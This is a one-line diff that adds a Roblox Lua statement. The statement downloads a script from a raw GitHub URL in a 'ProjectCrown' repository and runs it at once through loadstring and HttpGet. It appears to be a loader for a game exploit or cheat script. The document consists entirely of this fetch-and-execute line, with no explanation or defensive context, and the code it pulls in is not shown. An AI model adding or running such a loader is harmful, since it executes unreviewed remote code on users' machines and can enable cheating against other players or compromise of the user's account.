@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/ProjectCrown/KDC21-ProjectCrown/crown/crown.ko.kr"),true))()
